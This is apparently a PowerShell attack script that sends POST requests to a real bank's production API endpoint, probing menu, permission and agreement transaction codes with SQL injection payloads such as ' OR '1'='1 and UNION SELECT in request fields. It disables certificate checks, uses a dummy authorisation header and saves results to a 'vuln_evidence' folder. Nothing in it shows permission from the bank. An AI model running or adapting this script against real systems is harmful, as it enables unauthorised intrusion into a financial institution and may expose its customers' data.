$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"

# Test APIs that require parameters - try to pass parameters and SQL injection payloads
$testCases = @(
    # queryMenuTreeBySysIdRoleId requires roleIds and sysId
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; ExtraParams=@{roleIds="styy-guest"; sysId="M39"}},
    # queryActionPermissionByMenuIdRoleId requires systemId, roleIds, menuId
    @{TranCode="SSP-AUTH/queryActionPermissionByMenuIdRoleId"; ExtraParams=@{systemId="M39"; roleIds="styy-guest"; menuId="M3901"}},
    # getAgreementInfo requires templateId
    @{TranCode="AGRE-AGRE/getAgreementInfo"; ExtraParams=@{templateId="FDC1360000"}},
    # queryCustComponentDetail - try with templateId
    @{TranCode="CUST-INFO/queryCustComponentDetail"; ExtraParams=@{templateId="FDP1610000"}},
    # SQL injection test on queryMenuTreeBySysIdRoleId
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; ExtraParams=@{roleIds="' OR '1'='1"; sysId="M39"}},
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; ExtraParams=@{roleIds="styy-guest' OR '1'='1"; sysId="M39"}},
    @{TranCode="SSP-AUTH/queryMenuTreeBySysIdRoleId"; ExtraParams=@{roleIds="styy-guest"; sysId="M39' UNION SELECT 1,2,3--"}},
    # SQL injection test on getAgreementInfo
    @{TranCode="AGRE-AGRE/getAgreementInfo"; ExtraParams=@{templateId="FDC1360000' OR '1'='1"}},
    @{TranCode="AGRE-AGRE/getAgreementInfo"; ExtraParams=@{templateId="' UNION SELECT 1,2,3,4,5--"}},
)

$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

$idx = 0
foreach ($tc in $testCases) {
    $idx++
    $api = $tc.TranCode
    $parts = $api -split '/'
    $service = $parts[1]

    $bodyObj = @{
        Header = @{
            CurrentPageNum = 1
            PageTotalNum = 10
            NoRetCode = $true
            BranchId = "800000"
            LegalRepCode = "10000"
            TranTeller = ""
            TranCode = $api
            TranDate = "20260716"
            TranTime = "004500000"
            ServiceName = $service
            ServiceCode = "D20190130"
            AuthFlag = "0"
            AuthrTellerNo = "1"
            Channel = "39"
            ConsumerId = "1"
            GlobalSeq = "1"
            GlobalSeqNo = "1"
            KeyId = "1"
            LocalLang = "1"
            Mac = "1"
            SourceSysId = "1111"
            TerminalCode = "1121"
            TranSeq = "1"
            TranSeqNo = "1"
            TranTellerNo = "1"
            ExtendContent = "1"
            TotalNum = "0"
        }
    }
    # Add extra params at the top level
    foreach ($k in $tc.ExtraParams.Keys) {
        $bodyObj[$k] = $tc.ExtraParams[$k]
    }
    $body = $bodyObj | ConvertTo-Json -Depth 5 -Compress

    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $body)

    $paramStr = ($tc.ExtraParams.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ", "
    Write-Host "[$idx/$($testCases.Count)] $api"
    Write-Host "    Params: $paramStr"

    $resp = curl.exe -sk --noproxy "*" --max-time 15 -X POST "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest" -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary "@$tempFile" 2>&1
    Remove-Item $tempFile -Force

    $retCode = ""
    $retMsg = ""
    if ($resp -match '"RetCode":"([^"]*)"') { $retCode = $Matches[1] }
    if ($resp -match '"RetMsg":"([^"]*)"') { $retMsg = $Matches[1] }

    $status = if ($retCode -eq "000000") { "SUCCESS" } elseif ($retCode) { "ERR:$retCode" } else { "OTHER" }
    Write-Host "    Status: $status | RetCode=$retCode RetMsg=$retMsg"
    
    # Show response preview
    $preview = if ($resp.Length -gt 300) { $resp.Substring(0,300) + "..." } else { $resp }
    Write-Host "    Response: $preview"
    Write-Host ""
    Start-Sleep -Milliseconds 300
}
